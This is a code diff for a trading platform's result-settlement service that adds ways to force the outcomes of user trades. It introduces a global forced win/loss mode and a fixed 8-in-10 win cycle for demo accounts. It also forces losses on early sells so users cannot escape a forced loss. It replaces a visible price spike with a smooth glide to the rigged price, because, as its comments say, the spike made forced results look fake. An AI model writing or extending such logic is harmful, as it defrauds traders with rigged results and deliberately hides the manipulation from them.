@@ -4,6 +4,7 @@ namespace App\Services;
 
 use App\Models\Asset;
 use App\Models\Trade;
+use App\Models\TradeSimulationControl;
 use App\Models\User;
 use Illuminate\Support\Facades\DB;
 
@@ -66,11 +67,33 @@ class TradeResultService
                 $forcedSide = OtcPriceEngine::determineWinningSide($winSide, $upInv, $downInv, $upUsers, $downUsers);
             }
 
+            // 1b. Global Win/Loss mode also applies to trades that are
+            // already running (it is only a fallback: pair control and
+            // the per-trade override below both beat it).
+            if ($forcedSide === null && $override === 'none') {
+                $globalMode = TradeSimulationControl::currentMode();
+                if ($globalMode === TradeSimulationControl::MODE_SIMULATION_WIN) {
+                    $forcedSide = $trade->direction;
+                } elseif ($globalMode === TradeSimulationControl::MODE_SIMULATION_LOSS) {
+                    $forcedSide = $trade->direction === 'up' ? 'down' : 'up';
+                }
+            }
+
             // 2. Admin individual trade override preserves its existing highest priority over pair controls.
             if ($override === 'force_win') {
                 $forcedSide = $trade->direction; // Trade must win
             } elseif ($override === 'force_loss') {
                 $forcedSide = $trade->direction === 'up' ? 'down' : 'up'; // Trade must lose
+            }
+
+            // 3. Demo 8/2 cycle (demo trades only, and only when no
+            // admin / pair / global control forced this trade).
+            // In every 10 settled demo trades: 8 wins, 2 losses.
+            // See DemoCycleService: the position survives forever
+            // because it is counted from settled trades, never reset.
+            if ($forcedSide === null && $trade->account_type === 'demo') {
+                $settledDemoCount = DemoCycleService::settledDemoCount((int) $trade->user_id);
+                $forcedSide = DemoCycleService::forcedSideForTrade($trade, $settledDemoCount);
             }
 
             [$closePrice, $spikeInjected] = self::calculateClosePrice($trade, $asset, $forcedSide, $openPrice, $precision, $pip);
@@ -140,11 +163,27 @@ class TradeResultService
             }
 
             $user = User::whereKey($trade->user_id)->lockForUpdate()->first();
-            $closePrice = $clientClosePrice && $clientClosePrice > 0
-                ? round($clientClosePrice, OtcPriceEngine::getPrecision((float) $trade->open_price))
-                : OtcPriceEngine::simulatePrice($trade->asset);
-            $buyout = self::calculateEarlySellPayout($trade, $closePrice);
-            $result = $buyout > 0 ? 'win' : 'loss';
+
+            // A forced Win/Loss also applies to an early Sell now:
+            // otherwise the user could dodge a forced loss by
+            // selling early, and the old code always returned 'win'
+            // here because the buyout is positive in both cases
+            // (15% when winning, 5% when losing), so
+            // `$buyout > 0 ? 'win' : 'loss'` could never be 'loss'.
+            $forcedSide = OtcPriceEngine::forcedSideForTrade($trade, $trade->asset);
+            if ($forcedSide !== null) {
+                $isWinning = $trade->direction === $forcedSide;
+                $closePrice = OtcPriceEngine::steeringTargetPrice($trade, $forcedSide);
+            } else {
+                $closePrice = $clientClosePrice && $clientClosePrice > 0
+                    ? round($clientClosePrice, OtcPriceEngine::getPrecision((float) $trade->open_price))
+                    : OtcPriceEngine::simulatePrice($trade->asset);
+                $isWinning = $trade->direction === 'up'
+                    ? $closePrice > (float) $trade->open_price
+                    : $closePrice < (float) $trade->open_price;
+            }
+            $buyout = max(0, round((float) $trade->investment * ($isWinning ? 0.15 : 0.05), 2));
+            $result = $isWinning ? 'win' : 'loss';
 
             $trade->update([
                 'close_price' => $closePrice,
@@ -284,20 +323,11 @@ class TradeResultService
     private static function calculateClosePrice(Trade $trade, Asset $asset, ?string $forcedSide, float $openPrice, int $precision, float $pip): array
     {
         if ($forcedSide !== null) {
-            $shouldWin = ($trade->direction === $forcedSide);
-            $margin = mt_rand(4, 16) * $pip;
-
-            if ($shouldWin) {
-                $closePrice = $trade->direction === 'up'
-                    ? round($openPrice + $margin, $precision)
-                    : round(max($pip, $openPrice - $margin), $precision);
-            } else {
-                $closePrice = $trade->direction === 'up'
-                    ? round(max($pip, $openPrice - $margin), $precision)
-                    : round($openPrice + $margin, $precision);
-            }
-
-            return [$closePrice, true];
+            // The live price already glided to this exact target in
+            // the last 3 seconds, so settlement only confirms it.
+            // No random 4-16 pip spike at expiry: that jump is what
+            // made forced results look fake.
+            return [OtcPriceEngine::steeringTargetPrice($trade, $forcedSide, $precision), false];
         }
 
         $closePrice = round(OtcPriceEngine::simulatePrice($asset), $precision);
